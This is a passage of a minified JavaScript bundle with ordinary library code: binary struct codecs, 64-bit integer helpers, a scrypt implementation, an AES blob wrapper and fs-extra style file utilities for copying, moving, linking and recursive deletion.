			encode: function n(o, i, s) {
				if (!Array.isArray(o)) throw new TypeError("value must be an Array instance");
				if (o.length !== e.length) throw new RangeError("value.length is out of bounds");
				return i || (i = new Buffer(t(o))), s || (s = 0), n.bytes = r.reduce(e, function(e, t, n) {
					return t.encode(o[n], i, e), e + t.encode.bytes
				}, s) - s, i
			},
			decode: function t(n, o, i) {
				o || (o = 0);
				var s = new Array(e.length);
				return t.bytes = r.reduce(e, function(e, t, r) {
					return s[r] = t.decode(n, e, i), e + t.decode.bytes
				}, o) - o, s
			},
			encodingLength: function(n) {
				if (!Array.isArray(n)) throw new TypeError("value must be an Array instance");
				if (n.length !== e.length) throw new RangeError("value.length is out of bounds");
				return t(n)
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	var r = n(35);
	e.exports = function(e, t) {
		if (!r.isAbstractCodec(e)) throw new TypeError("lengthType is invalid codec");
		if (!r.isAbstractCodec(t)) throw new TypeError("itemType is invalid codec");

		function n(n) {
			return r.reduce(n, function(e, n) {
				return e + t.encodingLength(n)
			}, e.encodingLength(n.length))
		}
		return {
			encode: function o(i, s, c) {
				if (!Array.isArray(i)) throw new TypeError("value must be an Array instance");
				return s || (s = new Buffer(n(i))), c || (c = 0), e.encode(i.length, s, c), o.bytes = r.reduce(i, function(e, n) {
					return t.encode(n, s, e), e + t.encode.bytes
				}, e.encode.bytes + c) - c, s
			},
			decode: function n(o, i, s) {
				i || (i = 0);
				var c = new Array(e.decode(o, i, s));
				return n.bytes = r.reduce(c, function(e, n, r) {
					return c[r] = t.decode(o, e, s), e + t.decode.bytes
				}, e.decode.bytes + i) - i, c
			},
			encodingLength: function(e) {
				if (!Array.isArray(e)) throw new TypeError("value must be an Array instance");
				return n(e)
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	var r = n(35);
	e.exports = function(e, t) {
		if ("number" != typeof e) throw new TypeError("length must be a number");
		if (!r.isAbstractCodec(t)) throw new TypeError("itemType is invalid codec");

		function n(e) {
			return r.reduce(e, function(e, n) {
				return e + t.encodingLength(n)
			}, 0)
		}
		return {
			encode: function o(i, s, c) {
				if (!Array.isArray(i)) throw new TypeError("value must be an Array instance");
				if (i.length !== e) throw new RangeError("value.length is out of bounds");
				return s || (s = new Buffer(n(i))), c || (c = 0), o.bytes = r.reduce(i, function(e, n) {
					return t.encode(n, s, e), e + t.encode.bytes
				}, c) - c, s
			},
			decode: function n(o, i, s) {
				i || (i = 0);
				var c = new Array(e);
				return n.bytes = r.reduce(c, function(e, n, r) {
					return c[r] = t.decode(o, e, s), e + t.decode.bytes
				}, i) - i, c
			},
			encodingLength: function(t) {
				if (!Array.isArray(t)) throw new TypeError("value must be an Array instance");
				if (t.length !== e) throw new RangeError("value.length is out of bounds");
				return n(t)
			}
		}
	}
}, function(e, t) {
	var n = {},
		r = 4294967295,
		o = 9007199254740991;

	function i(e) {
		return (e = ~e) < 0 && (e = 2147483648 + (2147483647 & e)), e
	}

	function s(e) {
		console.assert(e > -1 && e <= o, "number out of range"), console.assert(Math.floor(e) === e, "number must be an integer");
		var t = 0,
			n = 4294967295 & e,
			i = n < 0 ? 2147483648 + (2147483647 & e) : n;
		return e > r && (t = (e - i) / (r + 1)), [t, i]
	}

	function c(e) {
		if (e > -1) return s(e);
		var t = s(-e),
			n = i(t[0]),
			o = i(t[1]);
		return o === r ? (n += 1, o = 0) : o += 1, [n, o]
	}

	function a(e, t, n) {
		return n && 0 != (2147483648 & e) ? (e = i(e), t = i(t), console.assert(e < 2097152, "number too small"), -(e * (r + 1) + t + 1)) : (console.assert(e < 2097152, "number too large"), e * (r + 1) + t)
	}
	n.readInt64BE = function(e, t) {
		return t = t || 0, a(e.readUInt32BE(t), e.readUInt32BE(t + 4), !0)
	}, n.readInt64LE = function(e, t) {
		t = t || 0;
		var n = e.readUInt32LE(t);
		return a(e.readUInt32LE(t + 4), n, !0)
	}, n.readUInt64BE = function(e, t) {
		return t = t || 0, a(e.readUInt32BE(t), e.readUInt32BE(t + 4), !1)
	}, n.readUInt64LE = function(e, t) {
		t = t || 0;
		var n = e.readUInt32LE(t);
		return a(e.readUInt32LE(t + 4), n, !1)
	}, n.writeInt64BE = function(e, t, n) {
		n = n || 0;
		var r = c(e);
		t.writeUInt32BE(r[0], n), t.writeUInt32BE(r[1], n + 4)
	}, n.writeInt64LE = function(e, t, n) {
		n = n || 0;
		var r = c(e);
		t.writeUInt32LE(r[1], n), t.writeUInt32LE(r[0], n + 4)
	}, n.writeUInt64BE = function(e, t, n) {
		n = n || 0;
		var r = s(e);
		t.writeUInt32BE(r[0], n), t.writeUInt32BE(r[1], n + 4)
	}, n.writeUInt64LE = function(e, t, n) {
		n = n || 0;
		var r = s(e);
		t.writeUInt32LE(r[1], n), t.writeUInt32LE(r[0], n + 4)
	}, e.exports = n
}, function(e, t, n) {
	"use strict";
	var r = n(121);

	function o(e, t) {
		var n = Buffer.prototype["read" + e],
			r = Buffer.prototype["write" + e];

		function o(e, n, o) {
			return n || (n = new Buffer(t)), o || (o = 0), r.call(n, e, o), n
		}

		function i(e, t, r) {
			return t || (t = 0), r ? n.call(e.slice(t, r), 0) : n.call(e, t)
		}
		return o.bytes = i.bytes = t, {
			encode: o,
			decode: i,
			encodingLength: function() {
				return t
			}
		}
	}

	function i(e, t) {
		function n(e, n, r) {
			return n || (n = new Buffer(8)), r || (r = 0), t(e, n, r), n
		}

		function r(t, n, r) {
			return n || (n = 0), r ? e(t.slice(n, r), 0) : e(t, n)
		}
		return n.bytes = r.bytes = 8, {
			encode: n,
			decode: r,
			encodingLength: function() {
				return 8
			}
		}
	}
	t.Byte = o("UInt8", 1), t.Int8 = o("Int8", 1), t.UInt8 = o("UInt8", 1), t.Int16BE = o("Int16BE", 2), t.Int16LE = o("Int16LE", 2), t.UInt16BE = o("UInt16BE", 2), t.UInt16LE = o("UInt16LE", 2), t.Int32BE = o("Int32BE", 4), t.Int32LE = o("Int32LE", 4), t.UInt32BE = o("UInt32BE", 4), t.UInt32LE = o("UInt32LE", 4), t.Int64BE = i(r.readInt64BE, r.writeInt64BE), t.Int64LE = i(r.readInt64LE, r.writeInt64LE), t.UInt64BE = i(r.readUInt64BE, r.writeUInt64BE), t.UInt64LE = i(r.readUInt64LE, r.writeUInt64LE), t.FloatBE = o("FloatBE", 4), t.FloatLE = o("FloatLE", 4), t.DoubleBE = o("DoubleBE", 8), t.DoubleLE = o("DoubleLE", 8)
}, function(e, t, n) {
	"use strict";
	var r = n(35);
	e.exports = function(e) {
		if (!Array.isArray(e)) throw new TypeError("items must be an Array instance");

		function t(t) {
			return r.reduce(e, function(e, n) {
				return e + n.type.encodingLength(t[n.name])
			}, 0)
		}
		return e = e.map(function(e) {
			if (Array.isArray(e) && (e = {
					name: e[0],
					type: e[1]
				}), !e || "string" != typeof e.name) throw new TypeError('item missing "name" property');
			if (!r.isAbstractCodec(e.type)) throw new TypeError('item "' + e.name + '" has invalid codec');
			return {
				name: e.name,
				type: e.type
			}
		}), {
			encode: function n(o, i, s) {
				if ("object" != typeof o || null === o) throw new TypeError("expected value as object, got " + o);
				return i || (i = new Buffer(t(o))), s || (s = 0), n.bytes = r.reduce(e, function(e, t) {
					return t.type.encode(o[t.name], i, e), e + t.type.encode.bytes
				}, s) - s, i
			},
			decode: function t(n, o, i) {
				o || (o = 0);
				var s = {};
				return t.bytes = r.reduce(e, function(e, t) {
					return s[t.name] = t.type.decode(n, e, i), e + t.type.decode.bytes
				}, o) - o, s
			},
			encodingLength: t
		}
	}
}, function(e, t, n) {
	var r = n(28),
		o = 2147483647;

	function i(e, t, n, r, o) {
		if (Buffer.isBuffer(e) && Buffer.isBuffer(n)) e.copy(n, r, t, t + o);
		else
			for (; o--;) n[r++] = e[t++]
	}
	e.exports = function(e, t, n, s, c, a, u) {
		if (0 === n || 0 != (n & n - 1)) throw Error("N must be > 0 and a power of 2");
		if (n > o / 128 / s) throw Error("Parameter N is too large");
		if (s > o / 128 / c) throw Error("Parameter r is too large");
		var l, f = new Buffer(256 * s),
			d = new Buffer(128 * s * n),
			p = new Int32Array(16),
			h = new Int32Array(16),
			y = new Buffer(64),
			m = r.pbkdf2Sync(e, t, 1, 128 * c * s, "sha256");
		if (u) {
			var w = c * n * 2,
				b = 0;
			l = function() {
				++b % 1e3 == 0 && u({
					current: b,
					total: w,
					percent: b / w * 100
				})
			}
		}
		for (var g = 0; g < c; g++) v(m, 128 * g * s, s, n, d, f);
		return r.pbkdf2Sync(e, m, 1, a, "sha256");

		function v(e, t, n, r, o, i) {
			var s, c = 128 * n;
			for (e.copy(i, 0, t, t + c), s = 0; s < r; s++) i.copy(o, s * c, 0, 0 + c), E(i, 0, c, n), l && l();
			for (s = 0; s < r; s++) {
				var a = 0 + 64 * (2 * n - 1);
				x(o, (i.readUInt32LE(a) & r - 1) * c, i, 0, c), E(i, 0, c, n), l && l()
			}
			i.copy(e, t, 0, 0 + c)
		}

		function E(e, t, n, r) {
			var o;
			for (i(e, t + 64 * (2 * r - 1), y, 0, 64), o = 0; o < 2 * r; o++) x(e, 64 * o, y, 0, 64), k(y), i(y, 0, e, n + 64 * o, 64);
			for (o = 0; o < r; o++) i(e, n + 2 * o * 64, e, t + 64 * o, 64);
			for (o = 0; o < r; o++) i(e, n + 64 * (2 * o + 1), e, t + 64 * (o + r), 64)
		}

		function S(e, t) {
			return e << t | e >>> 32 - t
		}

		function k(e) {
			var t;
			for (t = 0; t < 16; t++) p[t] = (255 & e[4 * t + 0]) << 0, p[t] |= (255 & e[4 * t + 1]) << 8, p[t] |= (255 & e[4 * t + 2]) << 16, p[t] |= (255 & e[4 * t + 3]) << 24;
			for (i(p, 0, h, 0, 16), t = 8; t > 0; t -= 2) h[4] ^= S(h[0] + h[12], 7), h[8] ^= S(h[4] + h[0], 9), h[12] ^= S(h[8] + h[4], 13), h[0] ^= S(h[12] + h[8], 18), h[9] ^= S(h[5] + h[1], 7), h[13] ^= S(h[9] + h[5], 9), h[1] ^= S(h[13] + h[9], 13), h[5] ^= S(h[1] + h[13], 18), h[14] ^= S(h[10] + h[6], 7), h[2] ^= S(h[14] + h[10], 9), h[6] ^= S(h[2] + h[14], 13), h[10] ^= S(h[6] + h[2], 18), h[3] ^= S(h[15] + h[11], 7), h[7] ^= S(h[3] + h[15], 9), h[11] ^= S(h[7] + h[3], 13), h[15] ^= S(h[11] + h[7], 18), h[1] ^= S(h[0] + h[3], 7), h[2] ^= S(h[1] + h[0], 9), h[3] ^= S(h[2] + h[1], 13), h[0] ^= S(h[3] + h[2], 18), h[6] ^= S(h[5] + h[4], 7), h[7] ^= S(h[6] + h[5], 9), h[4] ^= S(h[7] + h[6], 13), h[5] ^= S(h[4] + h[7], 18), h[11] ^= S(h[10] + h[9], 7), h[8] ^= S(h[11] + h[10], 9), h[9] ^= S(h[8] + h[11], 13), h[10] ^= S(h[9] + h[8], 18), h[12] ^= S(h[15] + h[14], 7), h[13] ^= S(h[12] + h[15], 9), h[14] ^= S(h[13] + h[12], 13), h[15] ^= S(h[14] + h[13], 18);
			for (t = 0; t < 16; ++t) p[t] = h[t] + p[t];
			for (t = 0; t < 16; t++) {
				var n = 4 * t;
				e[n + 0] = p[t] >> 0 & 255, e[n + 1] = p[t] >> 8 & 255, e[n + 2] = p[t] >> 16 & 255, e[n + 3] = p[t] >> 24 & 255
			}
		}

		function x(e, t, n, r, o) {
			for (var i = 0; i < o; i++) n[r + i] ^= e[t + i]
		}
	}
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.encrypt = function(e, t, n) {
		const {
			authTag: o,
			iv: i,
			blob: s
		} = r.aesEncrypt(n, e);
		return t.blob = {
			authTag: o,
			iv: i
		}, {
			blob: s,
			blobKey: n
		}
	}, t.decrypt = function(e, t, n) {
		return r.aesDecrypt(n, e, t.blob)
	};
	var r = function(e) {
		if (e && e.__esModule) return e;
		var t = {};
		if (null != e)
			for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
		return t.default = e, t
	}(n(59))
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(7),
		i = n(1),
		s = n(19),
		c = n(31).pathExists;
	e.exports = {
		outputFile: r(function(e, t, n, r) {
			"function" == typeof n && (r = n, n = "utf8");
			const a = i.dirname(e);
			c(a, (i, c) => i ? r(i) : c ? o.writeFile(e, t, n, r) : void s.mkdirs(a, i => {
				if (i) return r(i);
				o.writeFile(e, t, n, r)
			}))
		}),
		outputFileSync: function(e, t, n) {
			const r = i.dirname(e);
			if (o.existsSync(r)) return o.writeFileSync.apply(o, arguments);
			s.mkdirsSync(r), o.writeFileSync.apply(o, arguments)
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7);
	e.exports = {
		symlinkType: function(e, t, n) {
			if (n = "function" == typeof t ? t : n, t = "function" != typeof t && t) return n(null, t);
			r.lstat(e, (e, r) => {
				if (e) return n(null, "file");
				t = r && r.isDirectory() ? "dir" : "file", n(null, t)
			})
		},
		symlinkTypeSync: function(e, t) {
			let n;
			if (t) return t;
			try {
				n = r.lstatSync(e)
			} catch (e) {
				return "file"
			}
			return n && n.isDirectory() ? "dir" : "file"
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(1),
		o = n(7),
		i = n(31).pathExists;
	e.exports = {
		symlinkPaths: function(e, t, n) {
			if (r.isAbsolute(e)) return o.lstat(e, (t, r) => t ? (t.message = t.message.replace("lstat", "ensureSymlink"), n(t)) : n(null, {
				toCwd: e,
				toDst: e
			})); {
				const s = r.dirname(t),
					c = r.join(s, e);
				return i(c, (t, i) => t ? n(t) : i ? n(null, {
					toCwd: c,
					toDst: e
				}) : o.lstat(e, (t, o) => t ? (t.message = t.message.replace("lstat", "ensureSymlink"), n(t)) : n(null, {
					toCwd: e,
					toDst: r.relative(s, e)
				})))
			}
		},
		symlinkPathsSync: function(e, t) {
			let n;
			if (r.isAbsolute(e)) {
				if (!(n = o.existsSync(e))) throw new Error("absolute srcpath does not exist");
				return {
					toCwd: e,
					toDst: e
				}
			} {
				const i = r.dirname(t),
					s = r.join(i, e);
				if (n = o.existsSync(s)) return {
					toCwd: s,
					toDst: e
				};
				if (!(n = o.existsSync(e))) throw new Error("relative srcpath does not exist");
				return {
					toCwd: e,
					toDst: r.relative(i, e)
				}
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(1),
		i = n(7),
		s = n(19),
		c = s.mkdirs,
		a = s.mkdirsSync,
		u = n(128),
		l = u.symlinkPaths,
		f = u.symlinkPathsSync,
		d = n(127),
		p = d.symlinkType,
		h = d.symlinkTypeSync,
		y = n(31).pathExists;
	e.exports = {
		createSymlink: r(function(e, t, n, r) {
			r = "function" == typeof n ? n : r, n = "function" != typeof n && n, y(t, (s, a) => s ? r(s) : a ? r(null) : void l(e, t, (s, a) => {
				if (s) return r(s);
				e = a.toDst, p(a.toCwd, n, (n, s) => {
					if (n) return r(n);
					const a = o.dirname(t);
					y(a, (n, o) => n ? r(n) : o ? i.symlink(e, t, s, r) : void c(a, n => {
						if (n) return r(n);
						i.symlink(e, t, s, r)
					}))
				})
			}))
		}),
		createSymlinkSync: function(e, t, n, r) {
			if (r = "function" == typeof n ? n : r, n = "function" != typeof n && n, i.existsSync(t)) return;
			const s = f(e, t);
			e = s.toDst, n = h(s.toCwd, n);
			const c = o.dirname(t);
			return i.existsSync(c) ? i.symlinkSync(e, t, n) : (a(c), i.symlinkSync(e, t, n))
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(1),
		i = n(7),
		s = n(19),
		c = n(31).pathExists;
	e.exports = {
		createLink: r(function(e, t, n) {
			function r(e, t) {
				i.link(e, t, e => {
					if (e) return n(e);
					n(null)
				})
			}
			c(t, (a, u) => a ? n(a) : u ? n(null) : void i.lstat(e, (i, a) => {
				if (i) return i.message = i.message.replace("lstat", "ensureLink"), n(i);
				const u = o.dirname(t);
				c(u, (o, i) => o ? n(o) : i ? r(e, t) : void s.mkdirs(u, o => {
					if (o) return n(o);
					r(e, t)
				}))
			}))
		}),
		createLinkSync: function(e, t, n) {
			if (i.existsSync(t)) return;
			try {
				i.lstatSync(e)
			} catch (e) {
				throw e.message = e.message.replace("lstat", "ensureLink"), e
			}
			const r = o.dirname(t);
			return i.existsSync(r) ? i.linkSync(e, t) : (s.mkdirsSync(r), i.linkSync(e, t))
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(1),
		i = n(7),
		s = n(19),
		c = n(31).pathExists;
	e.exports = {
		createFile: r(function(e, t) {
			function n() {
				i.writeFile(e, "", e => {
					if (e) return t(e);
					t()
				})
			}
			i.stat(e, (r, i) => {
				if (!r && i.isFile()) return t();
				const a = o.dirname(e);
				c(a, (e, r) => e ? t(e) : r ? n() : void s.mkdirs(a, e => {
					if (e) return t(e);
					n()
				}))
			})
		}),
		createFileSync: function(e) {
			let t;
			try {
				t = i.statSync(e)
			} catch (e) {}
			if (t && t.isFile()) return;
			const n = o.dirname(e);
			i.existsSync(n) || s.mkdirsSync(n), i.writeFileSync(e, "")
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(131),
		o = n(130),
		i = n(129);
	e.exports = {
		createFile: r.createFile,
		createFileSync: r.createFileSync,
		ensureFile: r.createFile,
		ensureFileSync: r.createFileSync,
		createLink: o.createLink,
		createLinkSync: o.createLinkSync,
		ensureLink: o.createLink,
		ensureLinkSync: o.createLinkSync,
		createSymlink: i.createSymlink,
		createSymlinkSync: i.createSymlinkSync,
		ensureSymlink: i.createSymlink,
		ensureSymlinkSync: i.createSymlinkSync
	}
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(27),
		i = n(1),
		s = n(19),
		c = n(49),
		a = r(function(e, t) {
			t = t || function() {}, o.readdir(e, (n, r) => {
				if (n) return s.mkdirs(e, t);
				r = r.map(t => i.join(e, t)),
					function e() {
						const n = r.pop();
						if (!n) return t();
						c.remove(n, n => {
							if (n) return t(n);
							e()
						})
					}()
			})
		});

	function u(e) {
		let t;
		try {
			t = o.readdirSync(e)
		} catch (t) {
			return s.mkdirsSync(e)
		}
		t.forEach(t => {
			t = i.join(e, t), c.removeSync(t)
		})
	}
	e.exports = {
		emptyDirSync: u,
		emptydirSync: u,
		emptyDir: a,
		emptydir: a
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(76).copySync,
		s = n(49).removeSync,
		c = n(19).mkdirsSync,
		a = n(75);

	function u(e, t, n) {
		return r.statSync(e).isDirectory() ? function(e, t, n) {
			const r = {
				overwrite: !1
			};
			n ? (s(t), o()) : o();

			function o() {
				return i(e, t, r), s(e)
			}
		}(e, t, n) : function(e, t, n) {
			const o = a(65536),
				i = n ? "w" : "wx",
				s = r.openSync(e, "r"),
				c = r.fstatSync(s),
				u = r.openSync(t, i, c.mode);
			let l = 1,
				f = 0;
			for (; l > 0;) l = r.readSync(s, o, 0, 65536, f), r.writeSync(u, o, 0, l), f += l;
			return r.closeSync(s), r.closeSync(u), r.unlinkSync(e)
		}(e, t, n)
	}
	e.exports = {
		moveSync: function e(t, n, i) {
			const a = (i = i || {}).overwrite || i.clobber || !1;
			if (t = o.resolve(t), n = o.resolve(n), t === n) return r.accessSync(t);
			if (function(e, t) {
					try {
						return r.statSync(e).isDirectory() && e !== t && t.indexOf(e) > -1 && t.split(o.dirname(e) + o.sep)[1].split(o.sep)[0] === o.basename(e)
					} catch (e) {
						return !1
					}
				}(t, n)) throw new Error(`Cannot move '${t}' into itself '${n}'.`);
			c(o.dirname(n)),
				function() {
					if (a) try {
						r.renameSync(t, n)
					} catch (r) {
						if ("ENOTEMPTY" === r.code || "EEXIST" === r.code || "EPERM" === r.code) return s(n), i.overwrite = !1, e(t, n, i);
						if ("EXDEV" !== r.code) throw r;
						return u(t, n, a)
					} else try {
						r.linkSync(t, n), r.unlinkSync(t)
					} catch (e) {
						if ("EXDEV" === e.code || "EISDIR" === e.code || "EPERM" === e.code || "ENOTSUP" === e.code) return u(t, n, a);
						throw e
					}
				}()
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(7),
		i = n(79),
		s = n(1),
		c = n(49).remove,
		a = n(19).mkdirs;

	function u(e, t, n, r) {
		o.stat(e, (i, s) => {
			if (i) return r(i);
			s.isDirectory() ? l(e, t, n, r) : function(e, t, n, r) {
				const i = n ? "w" : "wx",
					s = o.createReadStream(e),
					c = o.createWriteStream(t, {
						flags: i
					});

				function a() {
					o.unlink(e, r)
				}
				s.on("error", i => {
					s.destroy(), c.destroy(), c.removeListener("close", a), o.unlink(t, () => {
						"EISDIR" === i.code || "EPERM" === i.code ? l(e, t, n, r) : r(i)
					})
				}), c.on("error", e => {
					s.destroy(), c.destroy(), c.removeListener("close", a), r(e)
				}), c.once("close", a), s.pipe(c)
			}(e, t, n, r)
		})
	}

	function l(e, t, n, r) {
		const o = {
			overwrite: !1
		};

		function s() {
			i(e, t, o, t => {
				if (t) return r(t);
				c(e, r)
			})
		}
		n ? c(t, e => {
			if (e) return r(e);
			s()
		}) : s()
	}
	e.exports = {
		move: r(function e(t, n, r, i) {
			"function" == typeof r && (i = r, r = {});
			const l = r.overwrite || r.clobber || !1;
			! function(e, t, n) {
				o.stat(e, (r, o) => {
					if (r) return n(r);
					if (o.isDirectory()) {
						const r = t.split(s.dirname(e) + s.sep)[1];
						if (r) {
							const o = r.split(s.sep)[0];
							return n(null, !!o && (e !== t && t.indexOf(e) > -1 && o === s.basename(e)))
						}
						return n(null, !1)
					}
					return n(null, !1)
				})
			}(t, n, (f, d) => f ? i(f) : d ? i(new Error(`Cannot move '${t}' to a subdirectory of itself, '${n}'.`)) : void a(s.dirname(n), a => {
				if (a) return i(a);
				s.resolve(t) === s.resolve(n) ? o.access(t, i) : l ? o.rename(t, n, o => {
					if (!o) return i();
					if ("ENOTEMPTY" !== o.code && "EEXIST" !== o.code) {
						if ("EPERM" !== o.code) return "EXDEV" !== o.code ? i(o) : void u(t, n, l, i);
						setTimeout(() => {
							c(n, o => {
								if (o) return i(o);
								r.overwrite = !1, e(t, n, r, i)
							})
						}, 200)
					} else c(n, o => {
						if (o) return i(o);
						r.overwrite = !1, e(t, n, r, i)
					})
				}) : o.link(t, n, e => e ? "EXDEV" === e.code || "EISDIR" === e.code || "EPERM" === e.code || "ENOTSUP" === e.code ? u(t, n, l, i) : i(e) : o.unlink(t, i))
			}))
		})
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(19),
		s = n(60);
	e.exports = function(e, t, n) {
		const c = o.dirname(e);
		r.existsSync(c) || i.mkdirsSync(c), s.writeJsonSync(e, t, n)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(1),
		o = n(19),
		i = n(31).pathExists,
		s = n(60);
	e.exports = function(e, t, n, c) {
		"function" == typeof n && (c = n, n = {});
		const a = r.dirname(e);
		i(a, (r, i) => r ? c(r) : i ? s.writeJson(e, t, n, c) : void o.mkdirs(a, r => {
			if (r) return c(r);
			s.writeJson(e, t, n, c)
		}))
	}
}, function(e, t, n) {
	var r;
	try {
		r = n(7)
	} catch (e) {
		r = n(27)
	}

	function o(e, t) {
		var n, r = "\n";
		return "object" == typeof t && null !== t && (t.spaces && (n = t.spaces), t.EOL && (r = t.EOL)), JSON.stringify(e, t ? t.replacer : null, n).replace(/\n/g, r) + r
	}

	function i(e) {
		return Buffer.isBuffer(e) && (e = e.toString("utf8")), e = e.replace(/^\uFEFF/, "")
	}
	var s = {
		readFile: function(e, t, n) {
			null == n && (n = t, t = {}), "string" == typeof t && (t = {
				encoding: t
			});
			var o = (t = t || {}).fs || r,
				s = !0;
			"throws" in t && (s = t.throws), o.readFile(e, t, function(r, o) {
				if (r) return n(r);
				var c;
				o = i(o);
				try {
					c = JSON.parse(o, t ? t.reviver : null)
				} catch (t) {
					return s ? (t.message = e + ": " + t.message, n(t)) : n(null, null)
				}
				n(null, c)
			})
		},
		readFileSync: function(e, t) {
			"string" == typeof(t = t || {}) && (t = {
				encoding: t
			});
			var n = t.fs || r,
				o = !0;
			"throws" in t && (o = t.throws);
			try {
				var s = n.readFileSync(e, t);
				return s = i(s), JSON.parse(s, t.reviver)
			} catch (t) {
				if (o) throw t.message = e + ": " + t.message, t;
				return null
			}
		},
		writeFile: function(e, t, n, i) {
			null == i && (i = n, n = {});
			var s = (n = n || {}).fs || r,
				c = "";
			try {
				c = o(t, n)
			} catch (e) {
				return void(i && i(e, null))
			}
			s.writeFile(e, c, n, i)
		},
		writeFileSync: function(e, t, n) {
			var i = (n = n || {}).fs || r,
				s = o(t, n);
			return i.writeFileSync(e, s, n)
		}
	};
	e.exports = s
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromCallback,
		o = n(60);
	o.outputJson = r(n(137)), o.outputJsonSync = n(136), o.outputJSON = o.outputJson, o.outputJSONSync = o.outputJsonSync, o.writeJSON = o.writeJson, o.writeJSONSync = o.writeJsonSync, o.readJSON = o.readJson, o.readJSONSync = o.readJsonSync, e.exports = o
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(64),
		s = "win32" === process.platform;

	function c(e) {
		["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach(t => {
			e[t] = e[t] || r[t], e[t += "Sync"] = e[t] || r[t]
		}), e.maxBusyTries = e.maxBusyTries || 3
	}

	function a(e, t, n) {
		let r = 0;
		"function" == typeof t && (n = t, t = {}), i(e, "rimraf: missing path"), i.equal(typeof e, "string", "rimraf: path should be a string"), i.equal(typeof n, "function", "rimraf: callback function required"), i(t, "rimraf: invalid options argument provided"), i.equal(typeof t, "object", "rimraf: options should be object"), c(t), u(e, t, function o(i) {
			if (i) {
				if (("EBUSY" === i.code || "ENOTEMPTY" === i.code || "EPERM" === i.code) && r < t.maxBusyTries) {
					return r++, setTimeout(() => u(e, t, o), 100 * r)
				}
				"ENOENT" === i.code && (i = null)
			}
			n(i)
		})
	}

	function u(e, t, n) {
		i(e), i(t), i("function" == typeof n), t.lstat(e, (r, o) => r && "ENOENT" === r.code ? n(null) : r && "EPERM" === r.code && s ? l(e, t, r, n) : o && o.isDirectory() ? d(e, t, r, n) : void t.unlink(e, r => {
			if (r) {
				if ("ENOENT" === r.code) return n(null);
				if ("EPERM" === r.code) return s ? l(e, t, r, n) : d(e, t, r, n);
				if ("EISDIR" === r.code) return d(e, t, r, n)
			}
			return n(r)
		}))
	}

	function l(e, t, n, r) {
		i(e), i(t), i("function" == typeof r), n && i(n instanceof Error), t.chmod(e, 438, o => {
			o ? r("ENOENT" === o.code ? null : n) : t.stat(e, (o, i) => {
				o ? r("ENOENT" === o.code ? null : n) : i.isDirectory() ? d(e, t, n, r) : t.unlink(e, r)
			})
		})
	}

	function f(e, t, n) {
		let r;
		i(e), i(t), n && i(n instanceof Error);
		try {
			t.chmodSync(e, 438)
		} catch (e) {
			if ("ENOENT" === e.code) return;
			throw n
		}
		try {
			r = t.statSync(e)
		} catch (e) {
			if ("ENOENT" === e.code) return;
			throw n
		}
		r.isDirectory() ? h(e, t, n) : t.unlinkSync(e)
	}

	function d(e, t, n, r) {
		i(e), i(t), n && i(n instanceof Error), i("function" == typeof r), t.rmdir(e, s => {
			!s || "ENOTEMPTY" !== s.code && "EEXIST" !== s.code && "EPERM" !== s.code ? s && "ENOTDIR" === s.code ? r(n) : r(s) : function(e, t, n) {
				i(e), i(t), i("function" == typeof n), t.readdir(e, (r, i) => {
					if (r) return n(r);
					let s, c = i.length;
					if (0 === c) return t.rmdir(e, n);
					i.forEach(r => {
						a(o.join(e, r), t, r => {
							if (!s) return r ? n(s = r) : void(0 == --c && t.rmdir(e, n))
						})
					})
				})
			}(e, t, r)
		})
	}

	function p(e, t) {
		let n;
		c(t = t || {}), i(e, "rimraf: missing path"), i.equal(typeof e, "string", "rimraf: path should be a string"), i(t, "rimraf: missing options"), i.equal(typeof t, "object", "rimraf: options should be object");
		try {
			n = t.lstatSync(e)
		} catch (n) {
			if ("ENOENT" === n.code) return;
			"EPERM" === n.code && s && f(e, t, n)
		}
		try {
			n && n.isDirectory() ? h(e, t, null) : t.unlinkSync(e)
		} catch (n) {
			if ("ENOENT" === n.code) return;
			if ("EPERM" === n.code) return s ? f(e, t, n) : h(e, t, n);
			if ("EISDIR" !== n.code) throw n;
			h(e, t, n)
		}
	}

	function h(e, t, n) {
		i(e), i(t), n && i(n instanceof Error);
		try {
			t.rmdirSync(e)
		} catch (r) {
			if ("ENOTDIR" === r.code) throw n;
			if ("ENOTEMPTY" === r.code || "EEXIST" === r.code || "EPERM" === r.code) ! function(e, t) {
				i(e), i(t), t.readdirSync(e).forEach(n => p(o.join(e, n), t));
				const n = s ? 100 : 1;
				let r = 0;
				for (;;) {
					let o = !0;
					try {
						const i = t.rmdirSync(e, t);
						return o = !1, i
					} finally {
						if (++r < n && o) continue
					}
				}
			}(e, t);
			else if ("ENOENT" !== r.code) throw r
		}
	}
	e.exports = a, a.sync = p
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(19).mkdirsSync,
		s = n(77).utimesMillisSync,
		c = Symbol("notExist"),
		a = Symbol("existsReg");

	function u(e, t, n) {
		if (!n.filter || n.filter(e, t)) return function(e, t, n) {
			const i = (n.dereference ? r.statSync : r.lstatSync)(e);
			if (i.isDirectory()) return function(e, t, n, o) {
				const i = p(n);
				if (i === c) {
					if (h(t, n)) throw new Error(`Cannot copy '${t}' to a subdirectory of itself, '${n}'.`);
					return function(e, t, n, o) {
						return r.mkdirSync(n, e.mode), r.chmodSync(n, e.mode), d(t, n, o)
					}(e, t, n, o)
				}
